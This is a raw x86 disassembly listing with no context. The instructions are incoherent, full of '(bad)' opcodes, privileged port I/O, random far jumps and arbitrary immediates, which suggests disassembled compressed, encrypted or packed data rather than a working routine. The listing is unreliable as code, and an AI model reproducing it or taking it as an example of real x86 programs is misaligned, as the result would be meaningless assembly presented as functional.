  42a42f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a430:	mov    al,ds:0x57f05451
  42a435:	jl     0x42a43e
  42a437:	shl    BYTE PTR [esi-0x15],1
  42a43a:	out    0x47,al
  42a43c:	and    ebp,DWORD PTR [esi-0x5f]
  42a43f:	sar    DWORD PTR [edx-0x77595dab],1
  42a445:	ins    DWORD PTR es:[edi],dx
  42a446:	test   DWORD PTR [esi*1+0x26f72a92],edi
  42a44d:	mov    eax,0xf88bb5b5
  42a452:	outs   dx,DWORD PTR ds:[esi]
  42a453:	push   ss
  42a454:	add    ecx,DWORD PTR [edx-0x1a]
  42a457:	(bad)  [esi]
  42a459:	retf   0x94c2
  42a45c:	xchg   edx,eax
  42a45d:	dec    ecx
  42a45e:	xchg   edi,eax
  42a45f:	inc    ebp
  42a460:	lea    ebx,[edi+ebx*4-0x2f]
  42a464:	sbb    eax,0x2f76db44
  42a469:	les    edi,FWORD PTR [ecx-0x4f592b8e]
  42a46f:	push   eax
  42a470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a471:	test   al,0x89
  42a473:	add    BYTE PTR [edx-0x12],0xd
  42a477:	fwait
  42a478:	mov    ch,0x44
  42a47a:	mov    ah,0x1b
  42a47c:	iret   
  42a47d:	icebp  
  42a47e:	arpl   WORD PTR [edx],ax
  42a480:	dec    edx
  42a481:	mov    ecx,0x175b8d80
  42a486:	ins    BYTE PTR es:[edi],dx
  42a487:	pop    ds
  42a488:	add    cl,BYTE PTR [ebx]
  42a48a:	add    BYTE PTR cs:[edi+0xeb76da3],dl
  42a491:	add    esi,esi
  42a493:	sub    DWORD PTR [eax],esp
  42a495:	ficom  WORD PTR [ebx+0x62]
  42a498:	mov    edi,0x8b9bb55a
  42a49d:	gs (bad) 
  42a49f:	aas    
  42a4a0:	leave  
  42a4a1:	outs   dx,BYTE PTR ds:[esi]
  42a4a2:	dec    ecx
  42a4a3:	cmp    al,BYTE PTR [ebx+0x2e83a963]
  42a4a9:	cmp    BYTE PTR [esi-0x26],al
  42a4ac:	hlt    
  42a4ad:	addr16 pop edi
  42a4af:	retf   
  42a4b0:	dec    eax
  42a4b1:	pop    ebp
  42a4b2:	adc    bl,bl
  42a4b4:	ins    DWORD PTR es:[edi],dx
  42a4b5:	adc    al,0x6b
  42a4b7:	mov    ah,0x99
  42a4b9:	bound  eax,QWORD PTR [ecx]
  42a4bb:	inc    DWORD PTR [ebx+0x6db5b116]
  42a4c1:	ret    0x83b4
  42a4c4:	mov    DWORD PTR [ebp-0x2493a1b3],ebx
  42a4ca:	test   DWORD PTR [ebp+0x52767225],eax
  42a4d0:	into   
  42a4d1:	dec    ebp
  42a4d2:	ror    ebx,1
  42a4d4:	or     edx,ebx
  42a4d6:	push   eax
  42a4d7:	je     0x42a544
  42a4d9:	xchg   ebx,eax
  42a4da:	into   
  42a4db:	stos   BYTE PTR es:[edi],al
  42a4dc:	sbb    esi,ecx
  42a4de:	int3   
  42a4df:	(bad)  
  42a4e0:	push   0x2358a8eb
  42a4e5:	adc    DWORD PTR [esi],ecx
  42a4e7:	icebp  
  42a4e8:	push   0xba21b074
  42a4ed:	mov    ch,0x86
  42a4ef:	pop    esp
  42a4f0:	push   0x39c1fa37
  42a4f5:	rcl    DWORD PTR [esi+0x40],0x47
  42a4f9:	cmp    al,BYTE PTR [eax-0x523e0dd0]
  42a4ff:	add    DWORD PTR [eax+ebx*4],esi
  42a502:	pop    ebx
  42a503:	(bad)  
  42a504:	cmp    cl,dh
  42a506:	jmp    0x9355:0x436d156b
  42a50d:	pop    ebx
  42a50e:	aam    0x8a
  42a510:	add    eax,0x76f2e001
  42a515:	shl    dl,1
  42a517:	inc    ecx
  42a518:	sbb    eax,DWORD PTR [eax]
  42a51a:	mov    ecx,0xa5ebec89
  42a51f:	test   edx,edx
  42a521:	mov    dh,0x1b
  42a523:	icebp  
  42a524:	ja     0x42a4fd
  42a526:	cmc    
  42a527:	and    cl,BYTE PTR [edx+0x59]
  42a52a:	push   ss
  42a52b:	or     eax,DWORD PTR [ebp-0x53955956]
  42a531:	sub    ch,BYTE PTR cs:[esi+0x4b]
  42a535:	or     ebp,ebp
  42a537:	adc    BYTE PTR [esi],dl
  42a539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a53a:	ror    BYTE PTR [edx-0x2628682c],1
  42a540:	and    eax,0xd1b6e009
  42a545:	push   0xe92c7fb4
  42a54a:	mov    ebx,0x6c6e16f2
  42a54f:	nop
  42a550:	mov    ch,0xca
  42a552:	mov    bh,0x9d
  42a554:	lods   al,BYTE PTR ds:[esi]
  42a555:	lods   al,BYTE PTR ds:[esi]
  42a556:	lock mov al,0x65
  42a559:	mov    ds:0x6dacd821,al
  42a55e:	pop    ebx
  42a55f:	std    
  42a560:	mov    dh,0xb0
  42a562:	push   ebp
  42a563:	mov    edx,0x38eff82e
  42a568:	inc    ebx
  42a569:	or     BYTE PTR [edx+0x2c2ef20f],dh
  42a56f:	ins    DWORD PTR es:[edi],dx
  42a570:	fisttp DWORD PTR [edx+0x50]
  42a573:	js     0x42a573
  42a575:	or     cl,bl
  42a577:	nop
  42a578:	cmp    BYTE PTR [esp+edx*4+0x6d],0x61
  42a57d:	mov    ebx,0xb950ea35
  42a582:	sub    DWORD PTR [edx-0x1d],edi
  42a585:	pop    eax
  42a586:	dec    ebp
  42a587:	pop    ecx
  42a588:	mov    ebx,0x60b5b800
  42a58d:	bound  edx,QWORD PTR [ebx+0xe]
  42a590:	aad    0x6
  42a592:	cdq    
  42a593:	sbb    BYTE PTR [ebx],cl
  42a595:	or     ecx,DWORD PTR [ebp+0x40]
  42a598:	mul    BYTE PTR [edx+0x7]
  42a59b:	call   DWORD PTR [ebp-0x72]
  42a59e:	fcmovnbe st,st(6)
  42a5a0:	mov    eax,0x1be7d6c
  42a5a5:	stos   DWORD PTR es:[edi],eax
  42a5a6:	cld    
  42a5a7:	fwait
  42a5a8:	fwait
  42a5a9:	push   esi
  42a5aa:	lods   eax,DWORD PTR ds:[esi]
  42a5ab:	inc    eax
  42a5ac:	mov    ch,0x6c
  42a5ae:	ins    BYTE PTR es:[edi],dx
  42a5af:	das    
  42a5b0:	icebp  
  42a5b1:	(bad)  
  42a5b2:	les    eax,FWORD PTR [edi]
  42a5b4:	jmp    0x42a58c
  42a5b6:	add    eax,0x88517db0
  42a5bb:	adc    al,BYTE PTR [edx]
  42a5bd:	pop    es
  42a5be:	out    0xe8,eax
  42a5c0:	add    eax,0xc45112da
  42a5c5:	add    BYTE PTR [ebp-0x2e],ah
  42a5c8:	mov    cl,0xd0
  42a5ca:	test   al,0xda
  42a5cc:	call   0x1ca1355b
  42a5d1:	inc    ebp
  42a5d2:	rol    DWORD PTR [esi-0x50],1
  42a5d5:	mov    al,0xd5
  42a5d7:	or     ecx,esi
  42a5d9:	mov    dh,0xe5
  42a5db:	mov    es,WORD PTR [eax+0xd0d0b0b]
  42a5e1:	inc    edx
  42a5e2:	pop    ebx
  42a5e3:	lahf   
  42a5e4:	loop   0x42a5df
  42a5e6:	mov    bl,0x7b
  42a5e8:	fsubr  DWORD PTR [edx-0x29ef65d2]
  42a5ee:	fwait
  42a5ef:	mov    ds:0xf5b44de0,eax
  42a5f4:	shl    DWORD PTR [esi-0x1a],0x4a
  42a5f8:	pop    esi
  42a5fa:	enter  0x453,0x26
  42a5fe:	add    al,0xdb
  42a600:	inc    esi
  42a601:	mov    ebx,0x6bd411ec
  42a606:	(bad)  
  42a607:	in     al,dx
  42a608:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a609:	mov    ch,BYTE PTR [ebp+0x6b]
  42a60c:	pop    ss
  42a60d:	dec    edx
  42a60e:	xor    edx,DWORD PTR [esi]
  42a610:	inc    ecx
  42a611:	or     ebp,DWORD PTR gs:[ebx+0x3c]
  42a615:	jno    0x42a66b
  42a617:	mov    ch,0x5d
  42a619:	ror    DWORD PTR [ebp+0x7edad4d],0xf2
  42a620:	mov    dh,0xb5
  42a622:	jne    0x42a5cd
  42a624:	stos   DWORD PTR es:[edi],eax
  42a625:	xchg   BYTE PTR [edi],dl
  42a627:	(bad)
  42a62a:	aaa    
  42a62b:	iret   
  42a62c:	mov    esp,0xa5db041d
  42a631:	pop    edi
  42a632:	jecxz  0x42a61a
  42a634:	mov    ecx,0xb1c5be6e
  42a639:	ins    DWORD PTR es:[edi],dx
  42a63a:	mov    ch,0xb5
  42a63c:	fnsave [edx]
  42a63e:	repnz inc DWORD PTR [ebx+eax*8-0x47]
  42a643:	jno    0x42a6a0
  42a645:	fcomp  st(2)
  42a647:	push   edx
  42a648:	mov    esi,0x25bc860a
  42a64d:	retf   0x5003
  42a650:	fcmovnbe st,st(6)
  42a652:	adc    DWORD PTR [ebp+0x8],esi
  42a655:	add    ebp,DWORD PTR [ebx+0x44]
  42a658:	imul   ebp,DWORD PTR [edx+0x65],0xffffffca
  42a65c:	fsubr  QWORD PTR [eax-0x7e]
  42a65f:	(bad)  
  42a660:	cld    
  42a661:	scas   al,BYTE PTR es:[edi]
  42a662:	sbb    BYTE PTR ds:0x35df2aa3,0xba
  42a669:	ins    DWORD PTR es:[edi],dx
  42a66a:	dec    ebx
  42a66b:	pop    ds
  42a66c:	das    
  42a66d:	pop    ebp
  42a66e:	aam    0x6e
  42a670:	inc    esp
  42a671:	xor    BYTE PTR [eax+0xd6c50df],0xa0
  42a678:	and    edi,DWORD PTR [ecx]
  42a67a:	sbb    BYTE PTR [esi],cl
  42a67c:	pop    ecx
  42a67d:	xor    al,cl
  42a67f:	mov    dl,0x6d
  42a681:	push   eax
  42a682:	sbb    BYTE PTR [edx+eiz*2-0x4eb5e62f],bh
  42a689:	aam    0x54
  42a68b:	out    0xfd,eax
  42a68d:	jno    0x42a670
  42a68f:	jmp    0x42a6de
  42a691:	push   ebp
  42a692:	aaa    
  42a693:	xchg   esi,eax
  42a694:	push   eax
  42a695:	out    0xf3,eax
  42a697:	ins    BYTE PTR es:[edi],dx
  42a698:	(bad)  
  42a699:	pop    esp
  42a69a:	ret    
  42a69b:	inc    edx
  42a69c:	mov    ebx,0xbcbfb5b0
  42a6a1:	loopne 0x42a62f
  42a6a3:	in     eax,0x2c
  42a6a5:	bound  ebp,QWORD PTR [ebp-0x5a692712]
  42a6ab:	in     eax,dx
  42a6ac:	mov    bh,0xa4
  42a6ae:	push   ebx
  42a6af:	sub    DWORD PTR [esi+0x571788f3],ebx
  42a6b5:	lods   eax,DWORD PTR ds:[esi]
  42a6b6:	push   0xffffffb7
  42a6b8:	push   es
  42a6b9:	sbb    DWORD PTR [eax+0x5958f7d4],esp
  42a6bf:	inc    ebx
  42a6c0:	add    al,0x9b
  42a6c2:	mov    ds:0x2c91d21b,al
  42a6c7:	adc    ebp,eax
  42a6c9:	aas    
  42a6ca:	mov    esp,0x5e7340b0
  42a6cf:	jle    0x42a710
  42a6d1:	inc    ebx
  42a6d2:	push   ss
  42a6d3:	push   edx
  42a6d4:	add    dl,al
  42a6d6:	(bad)  
  42a6d8:	mov    bh,BYTE PTR [eax-0x625eae1]
  42a6de:	jae    0x42a687
  42a6e0:	ret    0xdb6d
  42a6e3:	pop    edx
  42a6e4:	bound  edi,QWORD PTR [edx+0x43]
  42a6e7:	push   edx
  42a6e8:	es sahf 
  42a6ea:	and    bh,ah
  42a6ec:	shr    BYTE PTR [eax+eiz*4+0x53b6ddb6],cl
  42a6f3:	outs   dx,DWORD PTR ds:[esi]
  42a6f4:	bound  ebx,QWORD PTR [ebp+0x4d3b719e]
  42a6fa:	(bad)  
  42a6fb:	outs   dx,BYTE PTR ds:[esi]
  42a6fc:	mov    ch,0x8d
  42a6fe:	pop    edx
  42a6ff:	xor    ebx,DWORD PTR [ecx-0x51]
  42a702:	ss in  eax,0x68
  42a705:	or     BYTE PTR [ebp-0x45],ch
  42a708:	ins    DWORD PTR es:[edi],dx
  42a709:	in     eax,dx
  42a70a:	xor    al,BYTE PTR [ebx+0x3b061132]
  42a710:	ret    0x4d30
  42a713:	mov    ds,WORD PTR [esi+0x6ed0cdc6]
  42a719:	lods   eax,DWORD PTR ds:[esi]
  42a71a:	pop    esi
  42a71b:	push   ecx
  42a71c:	xor    cl,dl
  42a71e:	dec    edx
  42a71f:	stos   BYTE PTR es:[edi],al
  42a720:	lods   eax,DWORD PTR ds:[esi]
  42a721:	repnz add dh,BYTE PTR ss:[edi]
  42a725:	mov    dh,0xcb
  42a727:	jmp    0x10:0x5d43d069
  42a72e:	div    BYTE PTR [esi]
  42a730:	adc    ecx,DWORD PTR [ebx]
  42a732:	(bad)  [eax-0x80]
  42a735:	fwait
  42a736:	rcl    BYTE PTR [eax],1
  42a738:	in     eax,0x35
  42a73a:	and    eax,0x176d6daa
  42a73f:	les    ecx,FWORD PTR [ebx+0x25c87a3d]
  42a745:	mul    ebx
  42a747:	ins    DWORD PTR es:[edi],dx
  42a748:	sbb    esp,DWORD PTR [eax]
  42a74a:	push   ss
  42a74b:	retf   0x2dac
  42a74e:	lea    ebp,ds:0x56a8f8c2
  42a754:	xor    eax,0x4699ce05
  42a759:	pop    ebx
  42a75a:	popa   
  42a75b:	fist   DWORD PTR [esi]
  42a75d:	(bad)  [eax-0x26]
  42a760:	push   ebx
  42a761:	push   esi
  42a762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a763:	lods   al,BYTE PTR ds:[esi]
  42a764:	xor    bh,BYTE PTR [eax-0x25]
  42a767:	(bad)  
  42a768:	outs   dx,BYTE PTR ds:[esi]
  42a769:	or     esi,ecx
  42a76b:	retf   
  42a76c:	push   eax
  42a76d:	mov    edx,0x79aab9a8
  42a772:	loopne 0x42a7e9
  42a774:	mov    bh,0x6
  42a776:	sub    BYTE PTR [ebp-0x3e939807],0x67
  42a77d:	push   eax
  42a77e:	adc    al,bl
  42a780:	mov    eax,ds:0x3e7db6e8
  42a785:	xchg   ebx,eax
  42a786:	pop    ss
  42a787:	cs push ebx
  42a789:	sbb    DWORD PTR [edi-0x5ab4fa86],esp
  42a78f:	mov    al,ds:0xfaef09aa
  42a794:	pop    ss
  42a795:	pop    ss
  42a796:	or     cl,BYTE PTR [ebx]
  42a798:	lods   al,BYTE PTR ds:[esi]
  42a799:	popf   
  42a79a:	sbb    DWORD PTR [edi-0x2503e27e],ebp
  42a7a0:	cs mov ch,ch
  42a7a3:	or     eax,DWORD PTR [esi-0x29]
  42a7a6:	and    edi,DWORD PTR [esi-0x2222700d]
  42a7ac:	fdiv   DWORD PTR ss:[esi+0x14a17131]
  42a7b3:	push   eax
  42a7b4:	sbb    eax,0x75c45580
  42a7b9:	pop    ebx
  42a7ba:	mov    al,ds:0x8400442c
  42a7bf:	cmp    BYTE PTR gs:0xd414b5d7,bl
  42a7c6:	push   eax
  42a7c7:	jns    0x42a7ff
  42a7c9:	or     eax,eax
  42a7cb:	ins    DWORD PTR es:[edi],dx
  42a7cc:	sub    dl,bl
  42a7ce:	add    cl,dh
  42a7d0:	pop    ss
  42a7d1:	lods   eax,DWORD PTR ds:[esi]
  42a7d2:	bound  edi,QWORD PTR [ecx+0x35b6e388]
  42a7d8:	inc    ebp
  42a7d9:	loop   0x42a82e
  42a7db:	cwde   
  42a7dc:	scas   eax,DWORD PTR es:[edi]
  42a7dd:	daa    
  42a7de:	sub    bl,BYTE PTR [esi]
  42a7e0:	push   es
  42a7e1:	dec    ebx
  42a7e2:	fild   DWORD PTR [esi-0x5bb5bba0]
  42a7e8:	std    
  42a7e9:	cmc    
  42a7ea:	das    
  42a7eb:	push   eax
  42a7ec:	mov    ebx,0x1752c0
  42a7f1:	and    DWORD PTR [edx],0xda0c538
  42a7f7:	push   eax
  42a7f8:	dec    ebx
  42a7f9:	sub    esp,esp
  42a7fb:	dec    edi
  42a7fc:	mov    edi,0xdb015393
  42a801:	scas   al,BYTE PTR es:[edi]
  42a802:	mov    al,ds:0xdfd7c24f
  42a807:	adc    BYTE PTR [ecx],ah
  42a809:	fmul   DWORD PTR [edx+0x54]
  42a80c:	mov    eax,ds:0x1a02adc7
  42a811:	and    esp,DWORD PTR [eax+0x1]
  42a814:	inc    ebx
  42a815:	fbstp  TBYTE PTR [edi+0x36ddd159]
  42a81b:	inc    edi
  42a81c:	ins    DWORD PTR es:[edi],dx
  42a81d:	out    0x8f,eax
  42a81f:	ins    DWORD PTR es:[edi],dx
  42a820:	or     eax,DWORD PTR [ebx-0x2b42eaef]
  42a826:	cs xchg esp,eax
  42a828:	mov    ds:0xa83ab517,al
  42a82d:	sahf   
  42a82e:	xchg   edx,eax
  42a82f:	add    ebp,edx
  42a831:	inc    edx
  42a832:	mov    ebx,0x4d0dd6f8
  42a837:	(bad)  
  42a838:	call   0xd4fc9bc3
  42a83d:	push   ebp
  42a83e:	mov    ch,0xc
  42a840:	sub    BYTE PTR [esi+0x2],bl
  42a843:	das    
  42a844:	rcr    BYTE PTR [ebx+ecx*2],0xb1
  42a848:	ins    DWORD PTR es:[edi],dx
  42a849:	pop    ebx
  42a84a:	and    esp,DWORD PTR [ecx+0x2071f8c2]
  42a850:	test   DWORD PTR [ebx+ebx*2+0x2f6b7443],ecx
  42a857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a858:	push   ebx
  42a859:	pop    es
  42a85a:	sbb    DWORD PTR [esi-0x2c],esi
  42a85d:	add    bh,BYTE PTR [ecx-0x5cefb54a]
  42a863:	dec    edi
  42a864:	dec    ecx
  42a865:	inc    eax
  42a866:	mov    ch,0xed
  42a868:	ret    0xfeb6
  42a86b:	ins    BYTE PTR es:[edi],dx
  42a86c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a86d:	fs mov ch,0x27
  42a870:	ud2    
  42a872:	pushf  
  42a873:	ret    0x83b6
  42a876:	jmp    0x2a1d:0x5cc738b6
  42a87d:	out    dx,al
  42a87e:	jno    0x42a859
  42a880:	dec    edx
  42a881:	push   esp
  42a882:	je     0x42a889
  42a884:	mov    bh,0xb0
  42a886:	out    0x6e,eax
  42a888:	mov    edi,0x85da97cb
  42a88d:	lods   eax,DWORD PTR ds:[esi]
  42a88e:	sub    edi,DWORD PTR [edi+0x484c25c7]
  42a894:	pop    ecx
  42a895:	pop    edi
  42a896:	add    ecx,DWORD PTR [esi+esi*4+0x51]
  42a89a:	pop    ebp
  42a89b:	adc    BYTE PTR [edx+0x6d],bl
  42a89e:	ins    BYTE PTR es:[edi],dx
  42a89f:	mov    ds:0xc6adad8c,al
  42a8a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8a5:	or     BYTE PTR [edx+0x28551e7e],bh
  42a8ab:	fs fcmovnbe st,st(6)
  42a8ae:	mov    dh,0x82
  42a8b0:	inc    esp
  42a8b1:	sub    DWORD PTR ds:0x7068dcc2,eax
  42a8b8:	push   ss
  42a8b9:	dec    edx
  42a8ba:	adc    BYTE PTR [ebx],cl
  42a8bc:	pop    ds
  42a8bd:	aad    0xb2
  42a8bf:	pop    esi
  42a8c0:	(bad)  
  42a8c1:	xchg   edi,eax
  42a8c2:	ficomp DWORD PTR [eax+0x58]
  42a8c5:	cmp    ch,BYTE PTR [edx+0x52]
  42a8c8:	or     DWORD PTR [ebp+ebx*2-0x6b],esi
  42a8cc:	nop
  42a8cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a8ce:	sub    BYTE PTR [ebp+0x29aa00e5],0xe1
  42a8d5:	mov    al,ds:0x96d1ceff
  42a8da:	cs push ecx
  42a8dc:	scas   eax,DWORD PTR es:[edi]
  42a8dd:	push   cs
  42a8de:	or     al,0xe9
  42a8e0:	pop    esp
  42a8e1:	sub    ecx,edx
  42a8e3:	cs mov al,0xb4
  42a8e6:	loope  0x42a901
  42a8e8:	outs   dx,BYTE PTR ds:[esi]
  42a8e9:	ror    DWORD PTR [edi],1
  42a8eb:	sub    DWORD PTR [edx+0x2f],eax
  42a8ee:	add    eax,0x72ba551b
  42a8f3:	mov    cs,edx
  42a8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a8f6:	xchg   esi,eax
  42a8f7:	xor    al,0xd7
  42a8f9:	ret    0xd1b6
  42a8fc:	mov    ebx,0x5c3dd218
  42a901:	or     BYTE PTR [eax-0x22579264],bh
  42a907:	mov    dh,0x2d
  42a909:	hlt    
  42a90a:	scas   eax,DWORD PTR es:[edi]
  42a90b:	sub    BYTE PTR [eax-0x73963617],0x10
  42a912:	aam    0x6e
  42a914:	popa   
  42a915:	sar    DWORD PTR [ebx+eiz*2],1
  42a918:	add    al,0x35
  42a91a:	push   0x55ada5b7
  42a91f:	in     al,dx
  42a920:	mov    eax,ds:0xd565ddec
  42a925:	pop    edx
  42a926:	sbb    eax,0xa58daab
  42a92b:	or     ch,BYTE PTR [edx+0x684dda00]
  42a931:	mov    bh,0x76
  42a933:	test   eax,0x2339aa78
  42a938:	stos   BYTE PTR es:[edi],al
  42a939:	mov    WORD PTR [eax],cs
  42a93b:	repz adc al,0xa9
  42a93e:	mov    ch,0xb6
  42a940:	sbb    DWORD PTR [edx+esi*1+0x62b50bc8],eax
  42a947:	sub    DWORD PTR [ebp+0x6b],ebp
  42a94a:	fld    TBYTE PTR [ebp-0x5]
  42a94d:	sub    al,0x5d
  42a94f:	(bad)  
  42a950:	repnz (bad) 
  42a954:	lock imul ebp,eax,0x5a
  42a958:	fdiv   DWORD PTR [esi-0x64d585ff]
  42a95e:	popf   
  42a95f:	sub    BYTE PTR [esi+0x40],dh
  42a962:	mov    bh,0x95
  42a964:	pop    edi
  42a965:	push   0x20
  42a967:	(bad)  
  42a968:	and    ecx,edx
  42a96a:	rcl    BYTE PTR [ebp+0x0],1
  42a96d:	sbb    bh,BYTE PTR ds:0x2dbb46d6
  42a973:	in     al,dx
  42a974:	pop    ecx
  42a975:	xor    DWORD PTR [ebp+0x115ab06c],0xffffffee
  42a97c:	ins    BYTE PTR es:[edi],dx
  42a97d:	sub    al,0x14
  42a97f:	(bad)  [esi+0x26]
  42a982:	pop    esp
  42a983:	push   es
  42a984:	int    0x3f
  42a986:	fwait
  42a987:	call   0x15dc:0xf5457608
  42a98e:	iret   
  42a98f:	and    esi,DWORD PTR [esp+edx*2-0x23]
  42a993:	fisub  DWORD PTR [eax]
  42a995:	xor    al,BYTE PTR [edx-0x3f1e7927]
  42a99b:	shr    BYTE PTR [eax],1
  42a99d:	ins    BYTE PTR es:[edi],dx
  42a99e:	sub    eax,0x279d5349
  42a9a3:	adc    eax,DWORD PTR [esi-0x4bbc9293]
  42a9a9:	call   0x1ad7d568
  42a9ae:	and    esp,DWORD PTR [edx+0x51]
  42a9b1:	test   DWORD PTR [ebp-0x5f],ebp
  42a9b4:	push   ebp
  42a9b5:	stos   BYTE PTR es:[edi],al
  42a9b6:	add    al,0x10
  42a9b8:	add    eax,0x819b1feb
  42a9bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9be:	test   DWORD PTR [ecx],ecx
  42a9c0:	jmp    0x42aa0a
  42a9c2:	in     al,dx
  42a9c3:	inc    eax
  42a9c4:	xchg   DWORD PTR [edx],esi
  42a9c6:	xor    DWORD PTR [esi],edx
  42a9c8:	mov    dh,0x5
  42a9ca:	inc    ebx
  42a9cb:	ds icebp 
  42a9cd:	mov    al,BYTE PTR [eax+0x7414af23]
  42a9d3:	add    al,0x17
  42a9d5:	mov    dh,0x5e
  42a9d7:	mul    DWORD PTR [ebx+esi*2-0x79]
  42a9db:	xor    edx,ebx
  42a9dd:	push   0xba725da1
  42a9e2:	imul   edx,DWORD PTR [eax+0x610dd770],0xffffffb8
  42a9e9:	ins    DWORD PTR es:[edi],dx
  42a9ea:	mov    cl,0x35
  42a9ec:	inc    esi
  42a9ed:	and    eax,DWORD PTR [ebx-0xa38434]
  42a9f3:	fdivr  st(2),st
  42a9f5:	pop    edi
  42a9f6:	jb     0x42aa49
  42a9f8:	mov    ebx,0x2e022378
  42a9fd:	add    BYTE PTR [esi],ch
  42a9ff:	jne    0x42aa01
  42aa01:	mov    al,ds:0xdaddb695
  42aa06:	mov    dh,0x53
  42aa08:	ss ins BYTE PTR es:[edi],dx
  42aa0a:	mov    dl,BYTE PTR [ebx]
  42aa0c:	mov    BYTE PTR [ebx],al
  42aa0e:	xlat   BYTE PTR ds:[ebx]
  42aa0f:	or     al,0x3e
  42aa11:	xchg   esi,eax
  42aa12:	mov    dh,0xa5
  42aa14:	test   ecx,eax
  42aa16:	shr    cl,cl
  42aa18:	(bad)  
  42aa19:	pop    ss
  42aa1a:	cs add eax,0xb17d6e96
  42aa20:	fst    QWORD PTR [eax-0x22]
  42aa23:	and    bh,ch
  42aa25:	cli    
  42aa26:	test   al,0x5e
  42aa28:	cmp    eax,0xb7041604
  42aa2d:	push   cs
  42aa2e:	add    bh,BYTE PTR [esi+0x34]
  42aa31:	bound  esi,QWORD PTR [ebx]
  42aa33:	xor    edx,ebp
  42aa35:	jo     0x42a9da
  42aa37:	jo     0x42aa67
  42aa39:	ret    0x1f49
  42aa3c:	not    ecx
  42aa3e:	stos   BYTE PTR es:[edi],al
  42aa3f:	(bad)  
  42aa40:	and    eax,0x8737047c
  42aa45:	call   0x702fd9a
  42aa4a:	outs   dx,DWORD PTR ds:[esi]
  42aa4b:	ret    0x5ebe
  42aa4e:	pusha  
  42aa4f:	mov    ds:0x867acd8b,eax
  42aa54:	scas   al,BYTE PTR es:[edi]
  42aa55:	mov    ebp,0x5436c26
  42aa5a:	or     ebx,ebx
  42aa5c:	push   cs
  42aa5d:	inc    edi
  42aa5e:	or     al,0x67
  42aa60:	pop    edi
  42aa61:	rcl    eax,0x57
  42aa64:	or     dl,BYTE PTR ss:[ecx*1+0x32b3346]
  42aa6c:	xchg   ecx,eax
  42aa6d:	mov    al,ds:0x74d85c2d
  42aa72:	add    eax,0x2b73b57c
  42aa77:	(bad)  
  42aa78:	gs add eax,0xead0b0b
  42aa7e:	les    esi,FWORD PTR ds:0xc043c18e
  42aa84:	ins    DWORD PTR es:[edi],dx
  42aa85:	imul   edx,DWORD PTR [esi+0x14],0xffffffb2
  42aa89:	push   cs
  42aa8a:	lock not ebp
  42aa8d:	ret    0xb5b6
  42aa90:	pop    ebx
  42aa91:	stos   BYTE PTR es:[edi],al
  42aa92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa93:	sar    cl,cl
  42aa95:	adc    al,0x7a
  42aa97:	sahf   
  42aa98:	push   0xbb54c6d
  42aa9d:	fcmovnb st,st(2)
  42aa9f:	daa    
  42aaa0:	xchg   ecx,eax
  42aaa1:	outs   dx,BYTE PTR ds:[esi]
  42aaa2:	pop    DWORD PTR [esi-0x2eb11fd2]
  42aaa8:	adc    ebx,ecx
  42aaaa:	das    
  42aaab:	mov    al,0xb0
  42aaad:	ins    BYTE PTR es:[edi],dx
  42aaae:	lea    ecx,[edx+0x79a5009d]
  42aab4:	xchg   edi,eax
  42aab5:	sbb    dl,BYTE PTR [eiz*4+0x23ef04d]
  42aabc:	outs   dx,BYTE PTR ds:[esi]
  42aabd:	add    BYTE PTR [ebx],cl
  42aabf:	mov    bh,0xd
  42aac1:	mov    dh,0xd
  42aac3:	jb     0x42aab4
  42aac5:	cwde   
  42aac6:	and    ebp,DWORD PTR [edi+0x5df3ac0b]
  42aacc:	add    ah,bl
  42aace:	push   0xa1a1f63e
  42aad3:	ret    
  42aad4:	repnz aaa 
  42aad6:	mov    dh,0x8e
  42aad8:	mov    bh,bl
  42aada:	xchg   BYTE PTR [edx-0x6eb7dd0e],ch
  42aae0:	mov    ?,WORD PTR [edx+0xe50ba8]
  42aae6:	adc    eax,0xc4c561d9
  42aaeb:	pop    edx
  42aaec:	xchg   ebx,eax
  42aaed:	or     dh,BYTE PTR [edi+0x48cc3605]
  42aaf3:	arpl   WORD PTR [ecx+edi*4-0x5c],di
  42aaf7:	int3   
  42aaf8:	dec    esp
  42aaf9:	fstp   QWORD PTR [eax-0x28]
  42aafc:	fdivr  st,st(6)
  42aafe:	mov    ecx,0x8cc41c39
  42ab03:	adc    eax,0x56c10f62
  42ab08:	fadd   DWORD PTR [edi+ecx*8]
  42ab0b:	pop    ds
  42ab0c:	or     DWORD PTR [ebx+0x6a5df005],0x70fe02db
  42ab16:	ja     0x42aaa8
  42ab18:	or     BYTE PTR [eax],cl
  42ab1a:	mov    bl,0x24
  42ab1c:	lods   eax,DWORD PTR ds:[esi]
  42ab1d:	push   ecx
  42ab1e:	mov    al,0xbc
  42ab20:	(bad)  
  42ab21:	aas    
  42ab22:	add    ah,bh
  42ab24:	call   0x5d6f856b
  42ab29:	fcmovu st,st(2)
  42ab2b:	(bad)  
  42ab2d:	fwait
  42ab2e:	sahf   
  42ab2f:	outs   dx,DWORD PTR ds:[esi]
  42ab30:	fst    QWORD PTR [ecx+edx*4-0x71]
  42ab34:	(bad)  
  42ab35:	mov    edx,0xc80136aa
  42ab3a:	rcr    BYTE PTR [ebp+0xd11c2be],1
  42ab40:	adc    DWORD PTR [edi+0x622e1daa],edx
  42ab46:	mov    bh,0xa
  42ab48:	jbe    0x42ab0e
  42ab4a:	lods   eax,DWORD PTR ds:[esi]
  42ab4b:	inc    edi
  42ab4c:	das    
  42ab4d:	lahf   
  42ab4e:	pop    eax
  42ab4f:	inc    esp
  42ab50:	add    ecx,DWORD PTR [ebp-0x4a]
  42ab53:	mov    ds:0x8fb76dad,al
  42ab58:	in     al,0x80
  42ab5a:	push   esi
  42ab5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab5c:	xchg   esp,eax
  42ab5d:	in     eax,0xbb
  42ab5f:	and    bl,BYTE PTR [eax-0x26]
  42ab62:	or     BYTE PTR ds:0x13d9f880,al
